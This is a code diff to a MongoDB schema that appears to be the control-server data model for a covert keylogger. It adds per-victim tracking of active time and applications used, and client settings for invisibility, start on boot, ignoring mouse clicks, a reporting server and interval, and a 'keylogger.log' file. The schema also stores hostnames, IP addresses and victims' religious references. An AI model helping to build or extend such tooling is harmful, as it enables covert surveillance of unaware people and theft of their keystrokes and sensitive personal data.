@@ -24,6 +24,12 @@ const ClientProfileSchema = new mongoose.Schema({
   religious_references: [String],
   total_sessions: Number,
   last_seen: Date,
+  total_days_active: Number,
+  total_active_time: Number, // in milliseconds
+  apps_used: [{
+    appname: String,
+    timespent: Number // in milliseconds
+  }],
   notes: String,              // Admin notes
   location: String,           // optional 
   system_info: {
@@ -31,6 +37,17 @@ const ClientProfileSchema = new mongoose.Schema({
     arch: String,
     hostname: String,
     ip: String
+  },
+  config: {
+    format: { type: Number, default: 0 }, // 0 = labels, 10 = decimal, 16 = hex
+    visible: { type: Boolean, default: false }, // true = VISIBLE, false = INVISIBLE
+    boot_wait: { type: Boolean, default: true }, // true = BOOT_WAIT, false = NOWAIT
+    mouse_ignore: { type: Boolean, default: true }, // true = ignore mouse clicks
+    serverName: { type: String, default: "localhost" },
+    resource: { type: String, default: "/" },
+    intervalMinutes: { type: Number, default: 5 }, // Minutes
+    log_file_name: { type: String, default: "keylogger.log" },
+    backend_port: { type: Number, default: 8000 }
   }
 });
 
